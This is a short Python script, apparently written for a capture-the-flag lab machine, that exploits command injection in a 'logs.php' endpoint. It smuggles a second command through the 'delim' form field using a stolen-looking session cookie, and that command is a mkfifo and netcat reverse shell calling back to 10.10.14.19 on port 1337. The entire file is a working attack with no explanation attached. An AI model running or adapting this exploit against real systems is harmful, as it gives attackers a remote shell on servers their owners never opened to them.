import requests

url = "http://10.10.11.104/logs.php"

headers = {
       'Cookie': 'PHPSESSID=55ucih7mp2c0b9bh3fmj925k6h'
        }

shell = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 1337 >/tmp/f"

data = {
        'delim':"; " + shell
        }

r = requests.post(url, data=data, headers=headers)

print(r.text)
